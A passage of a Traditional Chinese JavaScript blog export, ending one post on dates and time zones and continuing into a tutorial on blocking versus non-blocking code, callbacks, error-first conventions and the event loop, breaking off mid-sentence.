假設現在有一個大型的跨國網站，然後有個會員系統，註冊的時候要填生日，假設我生日是 2020-12-26 好了，那如果要存成 date time，就會是：2020-12-26T00:00:00+08:00。 好，這邊看起來沒什麼問題。 但顯示的話呢？要用什麼時區來顯示？看起來固定用台灣時區來顯示才不會出錯，可是這樣的話，系統也得知道我是台灣人，才能知道要用什麼時區來顯示。但是系統不一定會有這個資訊。 那看起來解法就是兩個，一個是系統直接存 2020-12-26，不存 date time 了，前端顯示也直接顯示字串，不要當作時間來解析。另一個則是「儲存跟顯示都用 UTC +0 時區來做」，這樣應該也不會有問題。 處理時間真的不容易，而且在時間上我們常會有許多錯誤的假設，可以參考 Your Calendrical Fallacy Is… 跟 Falsehoods programmers believe about time zones，裡面都提到了許多錯誤的認知。 從文章中也可以看出原生的 date 其實已經沒有辦法負荷日常使用了，因此只要是處理時間，基本上大家一定都會找一個 library 來用。目前有一個值得關注的提案叫做 Temporal，目前處於 stage2，希望能成為未來 JS 處理日期時間相關的標準。更詳細的介紹可以參考這一篇：Temporal - Date &amp; Time in JavaScript today! 或是這個簡報：Temporal walkthrough 最後，如果你有用 jest 寫測試，可以在 config 裡面加上 process.env.TZ = &#39;Asia/Taipei&#39;; 來指定測試要跑的時區，也可以直接用環境變數帶進去。 我自己習慣的做法是在兩個不同的時區都跑跑看，測試都有過才代表你是真的有寫對，而不只是誤打誤撞才寫對。","link":"/2020/12/26/javascript-date-time-and-timezone/"},{"title":"JavaScript 中的同步與非同步（上）：先成為 callback 大師吧！","text":"前言如果要舉出一個在 JavaScript 裡面很重要也很常用，但新手常常搞混的概念，那「非同步（Asynchronous）」當仁不讓，絕對是第一名。跟其他那些 this、closure、prototype 或是 hoisting 比起來，非同步在實際開發的時候用到的頻率高太多了，而且是初學者常常會踩坑的地方。 非同步真的那麼難嗎？ 我相信不是的。只要循著一個正確的脈絡前進，就可以循序漸進理解為什麼需要非同步，也能知道在 JavaScript 裡面是怎麼處理這種操作的。 類似的主題我其實在四年前就寫過，但現在回頭看實在是寫得滿差的，所以四年後重新挑戰這個主題，希望能寫出一篇品質不錯的文章，把非同步這件事情講清楚。 在寫這篇文章之前，參考了 Node.js 的官方文件，發現在非同步的講解上其實做得不錯，因此本文會以類似的切入點開始談這個問題。如果不會 Node.js 也沒關係，我底下會稍微做點介紹。 建議閱讀本文以前需要具備 JavaScript 基礎，知道如何使用 JavaScript 操作 DOM，也知道什麼是 ajax。 接著就讓我們開始吧！ Node.js 基本介紹JavaScript 是一個程式語言，會有程式語言本身所規範可以用的東西，例如說用var宣告變數，用if else進行判斷，或者是使用function宣告函式，這些東西都是 JavaScript 這個程式語言本身就有的部分。 既然我上面說了「程式語言本身就有的部分」，就代表也有一些東西其實是「不屬於 JavaScript 這個程式語言的」。 例如說document.querySelector(&#39;body&#39;)，可以讓你拿到 body 的 DOM 物件並且對它做操作，而操作之後會即時反應在瀏覽器的畫面上。 這個 document 是哪來的？其實是瀏覽器給 JavaScript 的，這樣才能讓 JavaScript 透過 document 這個物件與瀏覽器進行溝通，來操控 DOM。 如果你去翻 ECMAScript 的文件，你會發現裡面完全沒有出現document這個東西，因為它不是這個程式語言本身的一部份，而是瀏覽器提供的。 如果在瀏覽器上面跑 JavaScript，我們可以把瀏覽器稱作是 JavaScript 的「執行環境（runtime）」，因為 JavaScript 就跑在上面嘛，十分合理。 除了 document 以外，像是拿來計時的 setTimeout 與 setInterval，拿來做 ajax 的 XMLHttpRequest 與 fetch，這些都是瀏覽器這個執行環境所提供的東西。 那如果換了一個執行環境，是不是就有不同的東西可以用？除了瀏覽器以外，還有別的 JavaScript 的執行環境嗎？ 真巧，還真的剛好有，而且剛好你也聽過，就叫做 Node.js。 有很多人都以為它是一個 JavaScript 的 library，但其實不然，不過也不能怪大家，因為最後的.js兩個字很容易讓人誤解。如果你覺得那兩個字一直誤導你的話，可以暫且把它叫做 Node 就好。 Node.js 其實是 JavaScript 的一個執行環境，就如同它自己在官網上所說的： Node.js® is a JavaScript runtime built on Chrome’s V8 JavaScript engine. 所以 JavaScript 程式碼可以選擇跑在瀏覽器上，就可以透過瀏覽器這個執行環境提供的東西操控畫面，或者是發 Request 出去；也可以選擇跑在 Node.js 這個執行環境上面，就可以利用 Node.js 提供的東西。 那 Node.js 提供了什麼呢？例如說fs，全稱為 file system，是控制檔案的介面，所以可以用 JavaScript 來讀寫電腦裡的檔案！還提供了http這個模組，可以用 JavaScript 來寫 server！ 詳情請參考底下的示意圖： 可以很清楚地看到當 JavaScript 在不同環境底下執行時，可以用的東西也不一樣，端看執行環境提供了什麼。眼尖的人可能會發現上圖中 setTimeout 在兩個環境都有出現，這是為什麼呢？ 因為這兩個環境都覺得計時器這功能很重要，所以都提供了 setTimeout 這個函式給開發者使用。在兩個環境上的功能雖然是一模一樣的，但要注意的是因為執行環境不同，所以背後的實作方式以及原理也不同。 另外，執行環境不同，執行方式也會不同。以瀏覽器來說，就是用&lt;script src=&quot;index.js&quot;&gt;去引入一個 JavaScript 檔案，就可以在瀏覽器上執行；以 Node.js 來說，必須先在電腦上安裝 Node.js 這個執行環境，然後以 CLI 的方式用node index.js這個指令來執行。 幫大家整理一下目前的重點： JavaScript 只是程式語言，需要搭配執行環境提供的東西，例如說 setTiemout、document 等等 最常見的 JavaScript 執行環境有兩個，一個是瀏覽器，一個是 Node.js 不同的執行環境會提供不同的東西，例如說 Node.js 提供了 http 這個模組讓 JavaScript 可以寫一個伺服器，但瀏覽器就沒有提供這種東西 再來，我們會以 Node.js 的角度來開始介紹同步與非同步。 阻塞與非阻塞前面有提過 Node.js 有提供控制檔案的介面，讓我們可以寫一段 JavaScript 來讀取與寫入檔案，讓我們來看一段實際的程式碼： const fs = require('fs') // 引入內建 file system 模組 const file = fs.readFileSync('./README.md') // 讀取檔案 console.log(file) // 印出內容 上面這段程式碼先引入Node.js 提供的內建模組fs，再來使用fs.readFileSync來讀取檔案，最後把檔案的內容用console.log給印出來。 （附註：其實上面印出來的東西會是一個Buffer，完整程式碼應該為file.toString(&#39;utf8&#39;)才會印出檔案內容。但因為這個小細節不妨礙理解，所以在範例程式碼中刻意忽略） 看起來好像沒什麼問題…嗎？ 如果檔案小的話的確是沒什麼問題，但如果檔案很大呢？例如說檔案有 777 MB 好了，要把這麼大的檔案讀進記憶體，可能要花個幾秒鐘甚至更久。 在讀取檔案的時候，程式就會停在第二行，要等讀取檔案完畢以後，才會把檔案內容放到 file 這個變數裡，並且執行第三行console.log(file)。 換句話說，fs.readFileSync這個 method「阻擋」了後續指令的執行，這時候我們就說這個 method 是阻塞（blocking）的，因為程式的執行會一直 block 在這裡，直到執行完畢並且拿到回傳值為止。 如果後續的指令本來就都要等到檔案讀取完畢才能執行，例如說在檔案裡面尋找某個字串等等，這樣的方式其實沒什麼問題。但如果後續有些指令跟讀取檔案完全不相干，這不就虧大了嗎？ 舉例來說，如果我們想要讀取檔案，並且找出 1 到 99999999 之間的偶數： const fs = require('fs') const file = fs.readFileSync('./README.md') // 在這邊等好幾秒才往下執行 console.log(file) const arr = [] for (let i = 2; i &lt;= 99999999; i+=2) &#123; arr.push(i) &#125; console.log(arr) 上面的程式碼會先在讀取檔案那一行卡個幾秒，接著才執行下面的那一個部分，算出 1 到 99999999 之間的偶數並且印出來。 這兩件事情明明一點關聯都沒有，憑什麼印出偶數這件事情要等讀取檔案讀完才能做？難道兩件事情不能同時做嗎？這樣豈不是更有效率？ 還真的有這種東西，有另外一種方法可以讓這兩件事情同時進行。 原本readFileSync的問題在於它會阻塞後續程式碼的執行，就好像我去家裡附近的滷味攤買滷味，點好了交給老闆之後就要站在旁邊等，哪裡也不能去，因為我想吃到熱騰騰的滷味。如果我回家了然後每隔十分鐘再過來，可能滷味已經冷掉了，我不想這樣，我買的又不是冰滷味。 所以我只能站在旁邊癡癡等，癡癡冷，才能在第一時間就拿到剛起鍋的滷味。 阻塞（blocking）的對照就叫做非阻塞（non-blocking），意思就是不會阻擋後續程式碼的執行，就好像我去百貨公司美食街點餐一樣，點完以後店家會給我一個呼叫器（本體是紅茶的那間速食店也有），我拿到呼叫器以後就可以回位子上等，或我想先去逛個街也可以。等到餐點準備好的時候，呼叫器就會響，我就可以去店家領取餐點，不用在原地傻傻地等。 以讀取檔案來說，如果是非阻塞的話，是怎麼做到的呢？如果不會阻擋後續程式碼執行，那我該怎麼拿到檔案的內容？ 就跟美食街需要透過呼叫器來通知餐點完成一樣，在 JavaScript 想要做到非阻塞，你必須提供一個呼叫器給這個讀取檔案的 method，這樣它才能在檔案讀取完畢時來通知你。在 JavaScript 裡面，function 就很適合當作呼叫器！ 意思就是「當檔案讀取完畢時，請來執行這個 function，並且把結果傳進來」，而這個 function 又被稱作 callback function（回呼函式），有沒有突然覺得這名字取得真好？ Node.js 裡的 fs 模組除了readFileSync這一個 blocking 的 method 以外，還提供了另一個叫做readFile的 method，就是我們前面提到的非阻塞版本的讀取檔案，我們來看看程式碼長什麼樣子： // 讀取內建 fs 模組 const fs = require('fs') // 定義讀取檔案完成以後，要執行的 function function readFileFinished(err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125; &#125; // 讀取檔案，第二個參數是 callback function fs.readFile('./README.md', readFileFinished); 可以看得出來readFile的用法跟readFileSync差不多，但差別在於： readFile多了一個參數，而且要傳進參數的是一個 function readFileSync有回傳值，回傳值就是檔案內容，readFile看起來沒有 這就呼應到我上面所說的，blocking 與 non-blocking 的差別就在於 blocking 的 method 會直接回傳結果（也是因為這樣所以才會阻塞），但 non-blocking 的 method 執行完 function 以後就可以直接跳下一行了，檔案讀取完畢以後會把結果傳進 callback function。 在上面的程式碼中，readFileFinished 就是 callback function，就是美食街的呼叫器。「等餐點好了，讓呼叫器響」就跟「等檔案讀取完畢，讓 callback 被呼叫」是一樣的事情。 所以這一行：fs.readFile(&#39;./README.md&#39;, readFileFinished)的白話文解釋很簡單，就是：「請去讀取./README.md這個檔案，並且在讀取完畢以後呼叫readFileFinished，把結果傳進去」。 那我怎麼知道結果會怎麼傳進來？這就要看 API 文件了，每個 method 傳進來的參數都不一樣，以readFile來說，官方文件是這樣寫的： 裡面清楚寫到 callback 的第一個參數是 err，第二個參數是 data，也就是檔案內容。 所以fs.readFile做的事情很簡單，就是以某種不會阻塞的方式去讀取檔案，並且在讀取完成之後呼叫 callback function 並且把結果傳進去。 通常 callback function 都會使用匿名函式（Anonymous function）的寫法讓它變得更簡單，所以比較常見的形式其實是這樣： // 讀取內建 fs 模組 const fs = require('fs') // 讀取檔案 fs.readFile('./README.md', function(err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125; &#125;); 可以想成就是直接在第二個參數的地方宣告一個 function 啦，因為沒有名稱也不用給名稱，所以就叫做匿名函式。 而readFile既然不會阻塞，就代表後面的程式碼會立刻執行，因此我們來把前面找偶數的版本改寫成非阻塞看看： const fs = require('fs') /* 原來的阻塞版本： const file = fs.readFileSync('./README.md') // 在這邊等好幾秒才往下執行 */ fs.readFile('./README.md', function(err, data) &#123; if (err) &#123; console.log(err) &#125; else &#123; console.log(data) &#125; &#125;); const arr = [] for (let i = 2; i &lt;= 99999999; i+=2) &#123; arr.push(i) &#125; console.log(arr) 這樣子在等待讀檔的那幾秒鐘，系統就可以先往下執行做其他事情，不需要卡在那邊。 幫大家重點回顧一下： 阻塞（blocking）代表執行時程式會卡在那一行，直到有結果為止，例如說readFileSync，要等檔案讀取完畢才能執行下一行 非阻塞（non-blocking）代表執行時不會卡住，但執行結果不會放在回傳值，而是需要透過回呼函式（callback function）來接收結果 同步與非同步讀到這邊，你可能會疑惑說：「不是說要講同步（synchronous）與非同步（asynchronous）嗎？怎麼還沒出現？」 其實已經講完了。 Node.js 的官方文件是這麼說的： Blocking methods execute synchronously and non-blocking methods execute asynchronously. 阻塞的方法會同步地（synchronously）執行，而非阻塞的方法會非同步地（asynchronously）執行 readFileSync最後面的 Sync 就是代表synchronous的意思，說明這個方法是同步的。而readFile則是非同步的。 如果硬要用中文字面上的意思去解釋，會非常的痛苦，會想說：「同步不是同時進行嗎？感覺比較像是非阻塞阿，但怎麼卻反過來了？」 我從程式設計該同步還是非同步？得到了一個啟發，那就是只要換個方式解釋「同步」在電腦的領域中代表的意思就行了。 現在請想像有一群人腳綁在一起，在玩兩人三腳。這時候我們若是想讓他們「統一步伐」，也就是大家的腳步一致（同步），該怎麼做呢？當然是大家互相協調互相等待啊，腳速比較快的要放慢，比較慢的要變快。如果你已經踏了第一步，要等還沒踏出第一步的，等到大家都踏出第一步之後，才能開始踏出第二步。 所以不同的人在協調彼此的步伐，試著讓大家的腳步一致，就必須互相等待，這個就是同步。 非同步就很簡單了，就是意思反過來。雖然在玩兩人三腳，但沒有想要等彼此的意思，大家都各踏各的，所以有可能排頭已經到終點了，排尾還在中間的地方，因為大家腳步不一致，不同步。 程式也是一樣的，前面提過的又要讀檔又要印出偶數的範例中，同步指的就是彼此互相協調互相等待，所以讀檔還沒完成的時候，是不能印偶數的，印出偶數一定要等到讀取檔案結束之後才能進行。 非同步就是說各做各的，你讀檔就讀你的，我繼續印我的偶數，大家腳步不一致沒關係，因為我們本來就不同步。 總之呢，在討論到 JavaScript 的同步與非同步問題時，基本上你可以把非同步跟非阻塞劃上等號，同步與阻塞劃上等號。如果你今天執行一個同步的方法（例如說readFileSync），就一定會阻塞；如果執行一個非同步的方法（readFile），就一定不會阻塞。 不過要幫大家稍微補充一下，如果你不是在 JavaScript 而是在其他的層次討論這個問題時，答案就不一樣了。舉例來說，當你在查阻塞非阻塞以及同步非同步的時候，一定會查到一些跟系統 I&#x2F;O 有關的資料，我覺得那是不同層次的討論。 當你是在討論系統或是網路 I&#x2F;O 的時候，非同步跟非阻塞講的就是兩件事情，同步跟阻塞也是兩件事，是有不同含義的。 但如果我們的 context 侷限在討論 JavaScript 的同步與非同步問題，基本上 blocking 就是 synchronous，non-blocking 就是 asynchronous。前面提到的 Node.js 的官方文件也是把這兩個概念給混用。 一旦我們把這兩個東西劃上等號，就很好理解什麼是同步，什麼是非同步了，我直接把上一個段落的重點回顧改一下就行了： 同步（synchronous）代表執行時程式會卡在那一行，直到有結果為止，例如說readFileSync，要等檔案讀取完畢才能執行下一行 非同步（asynchronous）代表執行時不會卡住，但執行結果不會放在回傳值，而是需要透過回呼函式（callback function）來接收結果 瀏覽器上的同步與非同步前面都是以 Node.js 當做例子，現在終於要回歸到我們比較熟悉的前端瀏覽器了。 在前端寫 JavaScript 的時候有一個很常見的需求，那就是跟後端 API 串接拿取資料。假設我們有一個函式叫做getAPIResponse好了，可以 call API 拿資料回來。 同步的版本會長得像這樣： const response = getAPIResponse() console.log(response) 同步會發生什麼事？就會阻塞後面的執行，所以假設 API Server 主機規格很爛跑很慢需要等 10 秒，整個 JavaScript 引擎都必須等 10 秒，才能執行下一個指令。在我們用 Node.js 當範例的時候，有時候等 10 秒是可以接受的，因為只有執行這個程式的人需要等 10 秒而已，我可以去滑個 Instagram 再回來就好。 可是瀏覽器可以接受等 10 秒嗎？ 你想想看喔，如果把 JavaScript 的執行凍結在那邊 10 秒，就等於說讓執行 JavaScript 的執行緒（thread）凍結 10 秒。在瀏覽器裡面，負責執行 JavaScript 的叫做 main thread，負責處理跟畫面渲染相關的也是 main thread。換句話說，如果這個 thread 凍結 10 秒，就代表你怎麼點擊畫面都不會有反應，因為瀏覽器沒有資源去處理這些其他的事情。 也就是說，你的畫面看起來就像當掉了一樣。 （如果不知道什麼是 thread，請參考：Inside look at modern web browser，建議從 part1 開始讀，main thread 在 part3 的地方） 舉一個生活中的例子來比喻，如果你去你家巷口的店面點一塊雞排，點完之後一定要在現場等，這時候如果你朋友來找你玩，按你家門鈴，你就沒辦法回應，因為你不在家。所以你朋友只好乾等在那邊，等你買完雞排才能幫他們開門。 但如果店家導入了線上排隊系統，點完雞排之後可以透過 App 查看雞排製作狀況，那你就可以回家邊看電視邊等雞排，這時候如果朋友來按門鈴，你就可以直接幫他們開門，你朋友不用乾等。 「等雞排」指的就是「等待 Response」，「幫你朋友開門」指的就是「針對畫面的反應」，而「你」就是「main thread」。在你忙著等雞排的時候，是沒辦法幫朋友開門的。 畫面凍結的部分可以自己做一個很簡單的 demo 來驗證，只要建立一個這樣的 html 檔案就好了： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;div>凍結那時間，凍結初遇那一天&lt;/div> &lt;/body> &lt;script> var delay = 3000 // 凍結 3 秒 var end = +new Date() + delay console.log('delay start') while(new Date() &lt; end) &#123; &#125; console.log('delay end') &lt;/script> &lt;/html> 原理就是裡面的 while 會不斷去檢查時間到了沒，沒到的話就繼續等，所以會阻塞整個 main thread。也可以參考底下的 gif，在 delay end 出現之前，怎麼反白文字都沒有用，直到 delay end 出現以後才正常： 你可以接受畫面凍結嗎？不行嘛，就算你可以接受，你老闆、你客戶也不可能接受，所以像是網路這麼耗時的操作，是不可能讓它同步執行的。既然要改成非同步，那依據之前學過的，就要改成用 callback function 來接收結果： // 底下會有三個範例，都在做一模一樣的事情 // 主要是想讓初學者知道底下三個是一樣的，只是寫法不同 // 範例一 // 最初學者友善的版本，額外宣告函式 function handleResponst() &#123; console.log(response) &#125; getAPIResponse(handleResponst) // 範例二 // 比較常看到的匿名函式版本，功能跟上面完全一樣 getAPIResponse(function(err, response) &#123; console.log(response) &#125;) // 範例三 // 利用 ES6 箭頭函式簡化過後的版本 getAPIResponse((err, response) => &#123; console.log(response) &#125;) AJAX 的全名是：Asynchronous JavaScript and XML，有沒有看到開頭那個 A 的全名是：Asynchronous，就代表是非同步送出 Request 的意思。 上面我們用了一個假想中的函式 getAPIResponse 來做示範，主要是想說明「網路操作在前端不可能用同步的方式」，接著可以來看一下實際在前端呼叫後端 API 的程式碼會長什麼樣子： var request = new XMLHttpRequest(); request.open('GET', 'https://jsonplaceholder.typicode.com/users/1', true); request.onload = function() &#123; if (this.status >= 200 &amp;&amp; this.status &lt; 400) &#123; console.log(this.response) &#125; &#125;; request.send(); 你可能會想說：咦，怎麼看起來不太一樣？callback function 在哪裡？ 這邊的 callback function 就是 request.onload = 後面的那個函式，這一行的意思就是說：「當 response 回來時，請執行這個函式」。 此時，眼尖的人可能會發現：「咦？怎麼request.onload這個形式有點眼熟？」 你以為陌生卻熟悉的 callbackcallback function 的意思其實就是：「當某事發生的時候，請利用這個 function 通知我」，雖然乍看之下會以為很陌生，但其實你早就在用了。 例如說： const btn = document.querySelector('.btn_alert') btn.addEventListener('click', handleClick) function handleClick() &#123; alert('click!') &#125; 「當某事（有人點擊 .btn_alert 這個按鈕）發生時，請利用這個 function（handleClick）通知我」，handleClick不就是個 callback function 嗎？ 又或者是： window.onload = function() &#123; alert('load!') &#125; 「當某事（網頁載入完成）發生時，請利用這個 function（匿名函式）通知我」，這不也是 callback function 嗎？ 再舉最後一個範例： setTimeout(tick, 2000) function tick() &#123; alert('時間到！') &#125; 「當某事（過了兩秒）發生時，請利用這個 function（tick）通知我」，這都是一樣的模式。 在使用 callback function 時，有一個初學者很常犯的錯誤一定要特別注意。都說了傳進去的參數是 callback function，是一個「function」，不是 function 執行後的結果（除非你的 function 執行完會回傳 function，這就另當別論）。 舉例來說，標準錯誤範例會長得像這樣： setTimeout(tick(), 2000) function tick() &#123; alert('時間到！') &#125; // 或者是這樣 window.onload = load() function load() &#123; alert('load!') &#125; tick是一個 function，tick()則是執行一個 function，並且把執行完的回傳結果當作 callback function，簡單來講就是這樣： // 錯誤範例 setTimeout(tick(), 2000) function tick() &#123; alert('時間到！') &#125; // 上面的錯誤範例等同於 let fn = tick() setTimeout(fn, 2000) function tick() &#123; alert('時間到！') &#125; 由於 tick 執行後會回傳 undefined，所以 setTimeout 那行可以看成：setTimeout(undefined, 2000)，一點作用都沒有。 把 function 誤寫成 function call 以後，會產生的結果就是，畫面還是跳出「時間到！」三個字，可是兩秒還沒過完。因為這樣寫就等於是你先執行了 tick 這個 function。 window.onload 的例子也是一樣，可以看成是這樣： // 錯誤範例 window.onload = load() function load() &#123; alert('load!') &#125; // 上面的錯誤範例等同於 let fn = load() window.onload = fn 所以網頁還沒載入完成時就會執行 load 這個 function 了。 再次重申，tick 是 function，tick()是執行 function，這兩個的意思完全不一樣。 幫大家重點複習： 瀏覽器裡執行 JavaScript 的 main thread 同時也負責畫面的 render，因此非同步顯得更加重要而且必須，否則等待的時候畫面會凍結 callback function 的意思其實就是：「當某事發生的時候，請利用這個 function 通知我」 fn 是一個 function，fn() 是執行 function Callback function 的參數前面有提到說 callback function 的參數需要看文件才能知道，我們舉底下這個點擊按鈕為例： const btn = document.querySelector('.btn_alert') btn.addEventListener('click', handleClick) function handleClick() &#123; alert('click!') &#125; 從 MDN 的文件上，你可以看到它是這樣寫的： 一個叫做 event 的 object 會被傳進去，而這個 object 是在描述這個發生的事件。聽起來很抽象，但我們可以實際來實驗看看： const btn = document.querySelector('.btn_alert') btn.addEventListener('click', handleClick) function handleClick(e) &#123; console.log(e) &#125; 當我們點擊這個按鈕之後，可以看到 console 印出了一個有超級多屬性的物件： 仔細看你會發現這個物件其實就是在描述我剛剛的「點擊」，例如說 clientX 與 clientY 其實代表著剛剛這個點擊的座標。最常用的，你一定也聽過的就是e.target，可以拿到這個點擊事件發生的 DOM 物件。 不過這時新手可能會有個疑問：「剛剛文件上明明寫說傳進來的參數叫做 event，為什麼你用 e 也可以？」 這是因為 function 在傳送以及接收參數的時候，注重的只有「順序」，而不是文件上的名稱。文件上的名稱只是參考用的而已，並不代表你就一定要用那個名稱來接收。function 沒有那麼智慧，不會根據變數名稱來判斷是哪個參數。 所以你的 callback function 參數名稱想要怎麼取都可以，handleClick(e)、handleClick(evt)、handleClick(event) 或是 handleClick(yoooooo)都可以，都可以拿到瀏覽器所傳的event這個物件，只是叫做不同名稱而已。 Callback function 會接收什麼參數，要看文件才會知道。如果沒有文件的話，沒有人知道 callback 會被傳什麼參數進來。 話雖然是這樣講，但其實在很多地方，參數都會遵循一個慣例。 Callback 的 error first 慣例同步與非同步的差別除了 callback 以外還有一個，那就是錯誤處理。 回到我們開頭舉的那個同步讀取檔案的範例： const fs = require('fs') // 引入內建 file system 模組 const file = fs.readFileSync('./README.md') // 讀取檔案 console.log(file) // 印出內容 如果今天 ./README.md 這個檔案不存在，執行之後就會在 console 印出錯誤訊息： fs.js:115 throw err; ^ Error: ENOENT: no such file or directory, open './README.md' at Object.openSync (fs.js:436:3) at Object.readFileSync (fs.js:341:35) 要處理這種錯誤，可以用 try...catch 的語法去包住： const fs = require('fs') // 引入內建 file system 模組 try &#123; const file = fs.readFileSync('./README.md') // 讀取檔案 console.log(file) // 印出內容 &#125; catch(err) &#123; console.log('讀檔失敗') &#125; 當我們用 try...catch 包住以後，就能夠針對錯誤進行處理，以上面的例子來說，就會輸出「讀檔失敗」這四個字。 可是如果換成非同步的版本，事情就有點不太一樣了，請先看底下的範例程式碼： const fs = require('fs') // 引入內建 file system 模組 try &#123; // 讀取檔案 fs.readFile('./README.md', (err, data) => &#123; console.log(data) // 印出內容 &#125;) &#125; catch(err) &#123; console.log('讀檔失敗') &#125; 執行以後，console 居然沒有任何反應！明明發生了錯誤，可是卻沒有被 catch 到，這是為什麼呢？ 這就是同步與非同步另一個巨大的差異。 在同步的版本當中，我們會等待檔案讀取完畢才執行下一行，所以讀取檔案的時候出了什麼錯，就會把錯誤拋出來，我們就可以 try…catch 去處理。 但是在非同步的版本中，fs.readFile這個 function 只做了一件事，就是跟 Node.js 說：「去讀取檔案，讀取完之後呼叫 callback function」，做完這件事情之後就繼續執行下一行了。 所以讀取檔案那一頭發生了什麼事，我們是完全不知道的。 舉個例子，這就好像是餐廳的內外場，假設我負責外場，有人點了一碗牛肉麵，我就會朝廚房大喊：「一碗牛肉麵！」，就繼續服務下一個客戶了。喊完之後內場有沒有真的開始做牛肉麵？我不知道，但應該要有。內場如果牛肉賣完了做不出來，我喊的當下也是不會知道的。 那我要怎麼知道？ 假設牛肉真的賣完了，內場會主動來跟我說嘛，這時候我才會知道牛肉賣完了。 這就好像非同步的範例一樣，那一行只負責告訴系統「去讀檔」，剩下的不甘它的事，如果發生什麼事，必須主動告訴它，要用 callback 的方式來傳遞。 我們再複習一次開頭提過的 Node.js 的 readFile 的文件： callback 會有兩個參數，第一個是 err，第二個是 data，這樣你就知道 err 是怎麼來的了。只要在讀檔的時候碰到任何錯誤，例如說檔案不存在、檔案超過記憶體大小或是檔案沒有權限開啟等等，都會透過這個 err 參數傳進來，這個錯誤你用 try…catch 是抓不到的。 所以，當我們非同步地執行某件事情的時候，有兩點我們一定會想知道： 有沒有發生錯誤，有的話錯誤是什麼 這件事情的回傳值 舉例來說，讀取檔案我們會想知道有沒有錯誤，也想知道檔案內容。或是操作資料庫，我們會想知道指令有沒有下錯，也想知道回傳的資料是什麼。 既然非同步一定會想知道這兩件事，那就代表至少會有兩個參數，一個是錯誤，另一個是回傳值。小標題所說的「error first」，就代表錯誤「依照慣例」通常會放在第一個參數，其他回傳值放第二個以及第二個之後。 為什麼呢？ 因為錯誤只會有一個，但回傳值可能有很多個。 舉例來說，假設有一個getFileStats的 function 會非同步地去抓取檔案狀態，並且回傳檔案名稱、檔案大小、檔案權限以及檔案擁有者。如果把 err 放最後一個參數，我們的 callback 就會長這個樣子：function cb(fileName, fileSize, fileMod, fileOwner, err) 我一定要把所有參數都明確地寫出來，我才能拿到 err。換句話說，假設我今天只想要檔案名稱跟檔案大小，其他的我不在意，該怎麼辦？不怎麼辦，一樣得寫這麼長，因為 err 在最後一個。 如果把 err 擺前面的話，我就只要寫：function cb(err, fileName, fileSize) 就好，後面的參數我不想拿的話不要寫就好。 這就是為什麼要把 err 擺在最前面，因為我們一定會需要 err，但不一定需要後面所有的參數。因此你只要看到有 callback function，通常第一個參數都代表著錯誤訊息。 所以很常會看到這種處理方式，先判斷有沒有錯誤再做其他事情： const fs = require('fs') fs.readFile('./README.md', (err, data) => &#123; // 如果錯誤發生，處理錯誤然後返回，就不會繼續執行下去 if (err) &#123; console.log(err) return &#125; console.log(data) &#125;); 最後補充三點，第一點是 error first 只是個「慣例」，實際上會傳什麼參數還是要根據文件而定，你也可以寫一個把錯誤放在最後一個參數的 API 出來（但你不應該這樣做就是了）。 第二點是儘管是非同步，還是有可能利用 try catch 抓到錯誤，但是錯誤的「類型」不一樣，例如說： const fs = require('fs') try &#123; // 讀取檔案 fs.readFile('./README.md') &#125; catch(err) &#123; console.log('讀檔失敗') console.log(err) // TypeError [ERR_INVALID_CALLBACK]: Callback must be a function &#125; 這邊抓到的錯誤並不是「讀取檔案」所產生的錯誤，而是「呼叫讀取檔案這個 fucntion」所產生的錯誤。以前面餐廳的例子來說，就是客人點餐的時候你就知道東西賣完了，所以你根本不必去問內場，就可以直接跟客人說：「不好意思我們牛肉麵賣完囉，你要不要考慮點別的」。 最後一點想補充的是，有些人可能會問說：「那為什麼 setTimeout 或是 event listener 這些東西都沒有 err 這個參數？」 那是因為這幾個東西的應用場合不太一樣。 setTimeout 的意思是：「過了 n 秒後，請呼叫這個 function」，而 event listener 的意思是：「當有人點擊按鈕，請呼叫這個 function」。 「過了 n 秒」以及「點擊按鈕」這兩件事情是不會發生錯誤的。 但像是 readFile 去讀取檔案，就有可能在讀取檔案時發生錯誤；而 XMLHttpRequest 則是有另外的 onerror 可以用來捕捉非同步所產生的錯誤。 一樣來整理重點： callback function 的參數跟一般 function 一樣，是看「順序」而不是看名稱，沒有那麼智慧 依照慣例，通常 callback function 的第一個參數都是 err，用來告訴你有沒有發生錯誤（承第一點，你想取叫 e、error 或是 fxxkingError 都可以） 非同步還是有可能用 try catch 抓到錯誤，但那是代表你在「呼叫非同步函式」的時候就產生錯誤 理解非同步的最後一塊拼圖：Event loop前面講了這麼多非同步的東西，你有沒有想過非同步到底是怎麼做的？ 不是常常聽別人說 JavaScript 是 single thread，只有一個執行緒在跑嗎？可是如果真的是 single thread，怎麼可能達成非同步？ 想要理解非同步操作到底怎麼達成的，我唯一推薦這個影片：What the heck is the event loop anyway? | Philip Roberts | JSConf EU，每個看過的人都讚不絕口。 只要你看了這個影片，就會知道非同步背後是怎麼一回事了。因為這影片實在是講得太好了，因此我底下只會幫大家重點複習一下，請看完影片再往下閱讀，如果你還沒看的話…看一下啦，拜託。 在程式的執行裡面，會有一個東西叫做 call stack，基本上就是紀錄著每個 function 執行時需要用到的資源，以及記錄著 function 執行的順序。 舉例來說，考慮以下程式碼： function a() &#123; return 1 &#125; function b() &#123; a() &#125; function c() &#123; b() &#125; c() 我們先呼叫了 c，所以 call stack 長這樣（底下的範例會往上長）： c c 裡面呼叫了 b： b c b 裡面再呼叫了 a： a b c 當 a 執行完之後要回到哪一個 function 呢？很簡單，把 a 從 call stack 移除，在最上面的那個就是了： b c 接著 b 執行完，從 call stack 裡面拿出來： c c 執行完，call stack 清空，程式執行結束。 記錄著 function 執行順序以及其他需要的東西的地方就是 call stack，而知名的錯誤 stack overflow 指的就是 stack 太多東西滿出來了，例如說你遞迴呼叫一個 function 十萬次，stack 沒辦法存這麼多東西，於是就丟出 stack overflow 的錯誤。 JavaScript 的「只有一個 thread」指的就是只有一個 call stack，所以同一個時間只能執行一件事情。 那非同步到底是怎麼做到的呢？ 我只說「JavaScript 同一個時間只能執行一件事」，但是並沒有說「執行環境也是如此」。 例如說讀檔好了，我們上面把非同步讀檔的程式碼解釋為：「叫系統去讀檔，讀完檔之後透過 callback function 把結果傳回來」，在這背後 Node.js 可以用另一個 thread 去讀取檔案，這是完全沒有問題的。 setTimeout 也是如此，setTimeout(fn, 2000) 只是在告訴瀏覽器說：「2 秒以後幫我呼叫 fn 這個 function」，瀏覽器就可以開另外一個 thread 去計時，而不是利用 main 